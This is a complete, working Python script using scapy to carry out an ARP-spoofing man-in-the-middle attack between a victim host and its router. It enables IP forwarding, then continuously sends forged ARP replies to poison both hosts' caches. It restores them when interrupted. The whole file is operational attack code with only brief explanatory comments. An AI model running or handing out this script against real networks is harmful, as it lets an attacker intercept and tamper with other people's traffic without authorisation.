from scapy.all import *
import subprocess
import sys

def arp_spoof(destIP, destMAC, srcIP):
	packet = ARP(op="is-at", hwdst=destMAC, pdst=destIP, psrc=srcIP) # Since spoofed ARP replies map pdst to our MAC no hwsrc needed
	sendp(Ether(dst=destMAC)/packet, verbose=False)
	
def arp_restore(destIP, destMAC, srcIP, srcMAC):
	packet = ARP(op="is-at", hwdst=destMAC, pdst=destIP, hwsrc=srcMAC, psrc=srcIP)
	sendp(Ether(dst=destMAC)/packet, verbose=False)
	
def main():
	victimIP = sys.argv[1]
	routerIP = sys.argv[2]
	victimMAC = getmacbyip(victimIP)
	routerMAC = getmacbyip(routerIP)
	
	subprocess.run(["./EnableIPForwarding.sh"], check=True) # Set IP forwarding flag to forward packets on behalf of other machines
	
	try:
		print("Sending spoofed ARP packets")
		while True:
			arp_spoof(victimIP, victimMAC, routerIP) # ARP reply to victim has the router's IP with our MAC
			arp_spoof(routerIP, routerMAC, victimIP) # ARP reply to router has victim's IP with our MAC
	except KeyboardInterrupt:
		print("Restoring ARP tables")
		arp_restore(routerIP, routerMAC, victimIP, victimMAC)
		arp_restore(victimIP, victimMAC, routerIP, routerMAC)
		subprocess.run(["./DisableIPForwarding.sh"], check=True)
		quit()

if __name__ == "__main__":
	main()
